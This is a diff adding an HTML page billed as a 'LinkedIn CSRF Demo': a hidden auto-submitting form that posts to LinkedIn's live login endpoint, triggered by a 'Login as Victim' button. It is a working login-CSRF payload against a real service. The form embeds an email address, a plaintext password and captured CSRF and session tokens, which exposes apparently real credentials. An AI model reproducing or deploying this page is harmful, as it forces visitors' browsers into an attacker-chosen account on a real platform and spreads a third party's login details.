@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>LinkedIn CSRF Demo</title>
+</head>
+<body>
+  <h2>Clicking the button simulates a login CSRF attack.</h2>
+  <form id="csrfForm" action="https://www.linkedin.com/checkpoint/lg/login-submit" method="POST" style="display:none;">
+    <input type="hidden" name="csrfToken" value="ajax:4189453958436030168">
+    <input type="hidden" name="session_key" value="lodianaselora@gmail.com">
+    <input type="hidden" name="ac" value="0">
+    <input type="hidden" name="loginFailureCount" value="0">
+    <input type="hidden" name="sIdString" value="5c2d67b8-0c78-4558-b9e4-cc919b371792">
+    <input type="hidden" name="pkSupported" value="true">
+    <input type="hidden" name="parentPageKey" value="d_checkpoint_lg_consumerLogin">
+    <input type="hidden" name="pageInstance" value="urn:li:page:checkpoint_rm_sign_in_with_another_account;yAGoGBzERX6cuEslqXvU6A==">
+    <input type="hidden" name="trk" value="">
+    <input type="hidden" name="authUUID" value="">
+    <input type="hidden" name="session_redirect" value="">
+    <input type="hidden" name="loginCsrfParam" value="42ef6582-9cee-469b-8eb3-179d699689fb">
+    <input type="hidden" name="fp_data" value="default">
+    <input type="hidden" name="_d" value="d">
+    <input type="hidden" name="showGoogleOneTapLogin" value="true">
+    <input type="hidden" name="showAppleLogin" value="true">
+    <input type="hidden" name="showMicrosoftLogin" value="true">
+    <input type="hidden" name="controlId" value="d_checkpoint_lg_consumerLogin-login_submit_button">
+    <input type="hidden" name="session_password" value="Cremated123">
+    <input type="hidden" name="rememberMeOptIn" value="true">
+    <input type="hidden" name="loginFlow" value="REMEMBER_ME_OPTIN">
+  </form>
+
+  <button onclick="document.getElementById('csrfForm').submit();">Login as Victim</button>
+</body>
+</html>
